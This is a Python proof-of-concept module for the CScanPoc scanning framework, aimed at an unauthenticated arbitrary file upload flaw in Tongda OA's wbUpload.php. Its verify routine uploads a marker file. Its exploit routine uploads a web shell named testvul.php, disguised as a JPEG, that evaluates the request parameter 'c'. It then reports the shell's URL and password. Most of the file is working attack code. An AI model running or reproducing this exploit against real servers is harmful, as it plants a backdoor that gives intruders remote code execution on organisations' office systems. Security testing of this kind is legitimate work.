# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0003'  # 平台漏洞编号，留空
    name = '通达OA系统 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2013-09-20'  # 漏洞公布时间
    desc = '''
        通达OA系统代表了协同OA的先进理念,16年研发铸就成熟OA产品。
        通达OA/general/vmeet/wbUpload.php 页面存在任意文件上传漏洞，进而getshell.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=037642'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '82113de0-1fc8-44c6-bf1c-4fffee662540'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2013-037642
            hh = hackhttp.hackhttp()
            post_data = '''
------WebKitFormBoundaryUynkBEtg4g2sRTR3\r
Content-Disposition: form-data; name="Filedata"; filename="temp.jpg"\r
Content-Type: image/jpeg\r
\r
testvul...\r
------WebKitFormBoundaryUynkBEtg4g2sRTR3--\r
'''
            content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUynkBEtg4g2sRTR3'
            upload_url = self.target + '/general/vmeet/wbUpload.php?fileName=testvul.php+'
            #proxy = ('127.0.0.1', 8887)
            code, head, res, errcode, _ = hh.http(
                upload_url, post=post_data, header=content_type)
            # print head
            if code != 200:
                return False
            verify_url = self.target + '/general/vmeet/wbUpload/testvul.php'
            code, head, res, errcode, _ = hh.http(verify_url)
            if code == 200 and 'testvul...' in res:
                #security_hole(arg + '：通达oa无需登录getshell')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2013-037642
            hh = hackhttp.hackhttp()
            post_data = '''
------WebKitFormBoundaryUynkBEtg4g2sRTR3\r
Content-Disposition: form-data; name="Filedata"; filename="temp.jpg"\r
Content-Type: image/jpeg\r
\r
testvul...\r
<%eval request("c")%>\r
------WebKitFormBoundaryUynkBEtg4g2sRTR3--\r
'''
            content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUynkBEtg4g2sRTR3'
            upload_url = self.target + '/general/vmeet/wbUpload.php?fileName=testvul.php+'
            #proxy = ('127.0.0.1', 8887)
            code, head, res, errcode, _ = hh.http(
                upload_url, post=post_data, header=content_type)
            # print head
            if code != 200:
                return False
            verify_url = self.target + '/general/vmeet/wbUpload/testvul.php'
            code, head, res, errcode, _ = hh.http(verify_url)
            if code == 200 and 'testvul...' in res:
                #security_hole(arg + '：通达oa无需登录getshell')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
